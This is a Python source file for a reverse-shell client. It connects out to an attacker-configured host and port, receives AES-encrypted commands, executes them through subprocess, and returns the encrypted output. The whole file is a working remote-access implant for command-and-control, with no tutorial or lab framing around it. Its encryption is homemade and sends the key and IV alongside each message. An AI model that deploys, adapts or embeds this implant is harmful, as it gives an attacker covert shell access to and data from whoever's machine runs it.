import socket
import subprocess
from Crypto.Cipher import AES
from base64 import b64decode, b64encode
from shlex import split
from textwrap import wrap
from rich.console import Console

console = Console()


class Client:
    def __init__(self):
        self.ip = "127.0.0.1"  # Change this
        self.port = 1337  # Change this
        self.s = None
        self.key = None
        self.iv = None

    def Connect(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((self.ip, self.port))
        self.cmds()

    def encrypt(self, data):
        pad = lambda s: s + (16 - len(s) % 16) * "\x0e"
        data = str(data).replace("b'", "").replace("'", "")
        stream = wrap(data, 16)
        padded = [i if len(i) == 16 else pad(i) for i in stream]
        aes = AES.new(self.key, AES.MODE_CBC, self.iv)
        encrypted = [aes.encrypt(i.encode()) for i in padded]
        console.print(f"Sending encrypted output: {b64encode(b''.join(encrypted))}\n")
        return b64encode(b''.join(encrypted))

    def decrypt(self, data):
        decoded = b64decode(data)
        self.key = decoded[0:16]
        self.iv = decoded[16:32]
        aes = AES.new(self.key, AES.MODE_CBC, self.iv)
        data = decoded[32:]
        cmd_stream = [data[i:i + 16] for i in range(0, len(data), 16)]
        decrypted = [aes.decrypt(i) for i in cmd_stream]
        decrypted = split(b''.join(decrypted).decode().replace("\x0e", ""))
        console.print(f"Decrypted:  {decrypted}")
        return decrypted

    def cmds(self):
        while True:
            try:
                data = self.s.recv(1024)
                if data.decode() == "l":
                    self.s.send(data)
                else:
                    console.print(f"[red]Received:[/red] {data}")
                    decrypted = self.decrypt(data)
                    data = subprocess.check_output(decrypted, stderr=subprocess.PIPE)
                    enc = self.encrypt(data)
                    self.s.send(enc)
            except:
                self.s.close()

    def main(self):
        self.Connect()


if __name__ == '__main__':
    run = Client()
    run.main()
